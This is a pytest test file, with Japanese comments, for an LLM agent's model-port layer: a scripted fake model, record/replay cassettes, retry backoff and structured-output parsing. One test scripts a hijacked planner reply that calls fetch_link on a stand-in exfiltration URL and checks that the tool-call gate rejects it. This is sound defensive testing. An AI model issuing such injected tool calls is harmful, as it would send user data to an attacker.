"""ModelPort の補助: ScriptedPort・cassette・RetryingPort・parse_structured。"""
import asyncio
import json

import pytest

import app.contracts as C
from app.errors import AppError, ErrorCode
from app.model.cassette import CassetteMiss, CassettePort
from app.model.port import ModelPort, parse_structured
from app.model.retry import RetryingPort
from app.model.scripted import ScriptedPort, ScriptExhausted, reply_calls, reply_json
from tests.factories import planner_request, reader_request


# --- ScriptedPort ----------------------------------------------------------------
async def test_scripted_port_returns_steps_in_order_and_records_requests():
    port = ScriptedPort([reply_json({"page_class": "content", "requirements": []}), reply_calls(("finish", {}))])
    assert isinstance(port, ModelPort)
    a = await port.generate(reader_request())
    b = await port.generate(planner_request())
    assert json.loads(a.text)["page_class"] == "content" and b.function_calls[0].name == "finish"
    assert len(port.requests) == 2 and port.requests[0].purpose is C.ModelPurpose.READER
    port.assert_all_used()


async def test_scripted_port_raises_when_the_script_runs_out():
    """23回目の呼び出し（乗っ取りモデルの再現）で、台本が尽きたことが検出できる。"""
    port = ScriptedPort([reply_json("{}")])
    await port.generate(reader_request())
    with pytest.raises(ScriptExhausted):
        await port.generate(reader_request())
    with pytest.raises(AssertionError):
        ScriptedPort([reply_json("{}")]).assert_all_used()


async def test_scripted_port_can_raise_and_compute_steps():
    boom = AppError(ErrorCode.RETRYABLE, "429")
    port = ScriptedPort([boom, lambda req: reply_json({"echo": req.purpose.value})])
    with pytest.raises(AppError):
        await port.generate(reader_request())
    assert json.loads((await port.generate(reader_request())).text) == {"echo": "reader"}


async def test_scripted_planner_replies_can_carry_hijacked_calls():
    port = ScriptedPort([reply_calls(("fetch_link", {"link_id": "https://evil.example.invalid/c?d=1", "reason": "x"}))])
    call = (await port.generate(planner_request())).function_calls[0]
    with pytest.raises(AppError) as ei:  # Governor の入口（parse_tool_call）で止まる
        C.parse_tool_call(call.name, call.args)
    assert ei.value.code is ErrorCode.INVALID_INPUT


def test_reply_helpers_set_usage_for_cost_accounting():
    r = reply_json({"a": 1}, tokens_in=500, tokens_out=40, thoughts=60)
    assert (r.usage.tokens_in, r.usage.tokens_out) == (500, 100)


# --- parse_structured ------------------------------------------------------------
def test_parse_structured_accepts_valid_and_rejects_everything_else():
    good = reply_json({"page_class": "content", "requirements": [{"quote": "q", "kind": "必須"}]})
    out = parse_structured(good, C.ReaderOutput)
    assert out.requirements[0].kind is C.Kind.REQUIRED
    for bad in (
        C.ModelResponse(model="m"),  # 空
        reply_json("not json"),
        reply_json({"page_class": "content", "requirements": [], "note": "追加欄"}),  # 未知の欄
        reply_json({"page_class": "nope", "requirements": []}),
        reply_json({"requirements": []}),
    ):
        with pytest.raises(AppError) as ei:
            parse_structured(bad, C.ReaderOutput)
        assert ei.value.code is ErrorCode.SCHEMA_VIOLATION


def test_parse_structured_error_detail_does_not_echo_the_model_output():
    with pytest.raises(AppError) as ei:
        parse_structured(reply_json('{"page_class":"content","requirements":[],"leak":"SECRET_VALUE"}'), C.ReaderOutput)
    assert "SECRET_VALUE" not in str(ei.value) and "SECRET_VALUE" not in ei.value.public_message


# --- cassette --------------------------------------------------------------------
async def test_cassette_records_then_replays_without_the_inner_port(tmp_path):
    path = tmp_path / "c.json"
    inner = ScriptedPort([reply_json({"n": 1}), reply_json({"n": 2}), reply_calls(("finish", {}))])
    rec = CassettePort(path, mode="record", inner=inner)
    r1 = await rec.generate(reader_request(contents="文書A"))
    await rec.generate(reader_request(contents="文書A"))  # 同じ要求の2回目（別の応答）
    await rec.generate(planner_request())
    play = CassettePort(path, mode="replay")
    assert (await play.generate(reader_request(contents="文書A"))) == r1
    assert json.loads((await play.generate(reader_request(contents="文書A"))).text) == {"n": 2}  # 記録の順に返す
    assert (await play.generate(planner_request())).function_calls[0].name == "finish"
    with pytest.raises(CassetteMiss):  # 使い切った
        await play.generate(reader_request(contents="文書A"))
    with pytest.raises(CassetteMiss):  # 要求が違う
        await play.generate(reader_request(contents="文書B"))


async def test_cassette_file_never_stores_the_prompt(tmp_path):
    path = tmp_path / "c.json"
    rec = CassettePort(path, mode="record", inner=ScriptedPort([reply_json({"ok": 1})]))
    await rec.generate(reader_request(contents="第三者の文章_UNIQUE_MARKER", system="指示_UNIQUE_MARKER"))
    raw = path.read_text(encoding="utf-8")
    assert "UNIQUE_MARKER" not in raw
    data = json.loads(raw)
    assert data["version"] == 1 and len(data["entries"][0]["key"]) == 64 and not list(tmp_path.glob("*.tmp"))


def test_cassette_requires_an_inner_port_to_record_and_checks_the_version(tmp_path):
    with pytest.raises(ValueError):
        CassettePort(tmp_path / "c.json", mode="record")
    (tmp_path / "old.json").write_text('{"version": 0, "entries": []}', encoding="utf-8")
    with pytest.raises(ValueError):
        CassettePort(tmp_path / "old.json", mode="replay")


async def test_cassette_record_propagates_inner_errors_without_writing(tmp_path):
    path = tmp_path / "c.json"
    rec = CassettePort(path, mode="record", inner=ScriptedPort([AppError(ErrorCode.FATAL_CONFIG)]))
    with pytest.raises(AppError):
        await rec.generate(reader_request())
    assert not path.exists()


# --- RetryingPort ----------------------------------------------------------------
class Sleeper:
    def __init__(self) -> None:
        self.delays: list[float] = []

    async def __call__(self, d: float) -> None:
        self.delays.append(d)


async def test_retries_retryable_errors_with_1s_then_8s_backoff():
    sleep = Sleeper()
    inner = ScriptedPort([AppError(ErrorCode.RETRYABLE, "429"), AppError(ErrorCode.RETRYABLE, "503"), reply_json("{}")])
    seen: list[tuple[int, ErrorCode, float]] = []
    port = RetryingPort(inner, retries=2, backoff_s=(1.0, 8.0), sleep=sleep, on_retry=lambda *a: seen.append(a))
    resp = await port.generate(reader_request())
    assert resp.text == "{}" and sleep.delays == [1.0, 8.0]
    assert seen == [(1, ErrorCode.RETRYABLE, 1.0), (2, ErrorCode.RETRYABLE, 8.0)]
    assert port.model_id == inner.model_id


async def test_gives_up_after_the_retry_budget():
    sleep = Sleeper()
    inner = ScriptedPort([AppError(ErrorCode.RETRYABLE)] * 3 + [reply_json("{}")])
    port = RetryingPort(inner, retries=2, backoff_s=(1.0, 8.0), sleep=sleep)
    with pytest.raises(AppError) as ei:
        await port.generate(reader_request())
    assert ei.value.code is ErrorCode.RETRYABLE and len(inner.requests) == 3 and sleep.delays == [1.0, 8.0]


@pytest.mark.parametrize("code", [ErrorCode.QUOTA, ErrorCode.FATAL_CONFIG, ErrorCode.KILLED, ErrorCode.SCHEMA_VIOLATION, ErrorCode.INTERNAL])
async def test_never_retries_non_retryable_errors(code):
    sleep = Sleeper()
    inner = ScriptedPort([AppError(code), reply_json("{}")])
    port = RetryingPort(inner, retries=2, backoff_s=(1.0, 8.0), sleep=sleep)
    with pytest.raises(AppError) as ei:
        await port.generate(reader_request())
    assert ei.value.code is code and sleep.delays == [] and len(inner.requests) == 1


async def test_wraps_foreign_exceptions_into_app_errors_and_retries_timeouts():
    sleep = Sleeper()
    inner = ScriptedPort([TimeoutError(), reply_json("{}")])
    assert (await RetryingPort(inner, retries=2, backoff_s=(1.0,), sleep=sleep).generate(reader_request())).text == "{}"
    inner = ScriptedPort([ValueError("boom")])
    with pytest.raises(AppError) as ei:
        await RetryingPort(inner, retries=2, backoff_s=(1.0,), sleep=sleep).generate(reader_request())
    assert ei.value.code is ErrorCode.INTERNAL and "boom" in ei.value.detail and isinstance(ei.value.__cause__, ValueError)


async def test_does_not_wait_past_the_wall_clock_deadline():
    sleep = Sleeper()
    now = [100.0]
    inner = ScriptedPort([AppError(ErrorCode.RETRYABLE), reply_json("{}")])
    port = RetryingPort(inner, retries=2, backoff_s=(8.0,), sleep=sleep, deadline_monotonic=105.0, clock=lambda: now[0])
    with pytest.raises(AppError):  # 100 + 8 >= 105 なので待たずに諦める
        await port.generate(reader_request())
    assert sleep.delays == [] and len(inner.requests) == 1


async def test_cancellation_is_not_swallowed():
    class Hang:
        model_id = "hang"

        async def generate(self, request):
            raise asyncio.CancelledError

    with pytest.raises(asyncio.CancelledError):
        await RetryingPort(Hang(), retries=2, backoff_s=(1.0,), sleep=Sleeper()).generate(reader_request())


def test_retry_needs_a_backoff_schedule():
    with pytest.raises(ValueError):
        RetryingPort(ScriptedPort([]), retries=1, backoff_s=())



def test_parse_structured_clips_only_overlong_top_level_lists():
    # 回帰（10/7 のライブ実行）: maxItems をスキーマから外すと、モデルが上限を超えて返し1チャンク丸ごとが捨てられた。
    import json as _json

    from app.contracts import ModelResponse, ReaderOutput
    from app.errors import AppError
    from app.model.port import parse_structured

    req = {"quote": "提出物は日本語で記載すること。", "kind": "必須"}
    over = ModelResponse(model="m", text=_json.dumps({"page_class": "content", "requirements": [req] * 45}, ensure_ascii=False))
    out = parse_structured(over, ReaderOutput)
    assert len(out.requirements) == 40
    # 件数超過以外の違反（未知の欄）は、これまでどおり拒否する
    bad = ModelResponse(model="m", text=_json.dumps({"page_class": "content", "requirements": [req] * 45, "extra": 1}, ensure_ascii=False))
    with pytest.raises(AppError):
        parse_structured(bad, ReaderOutput)
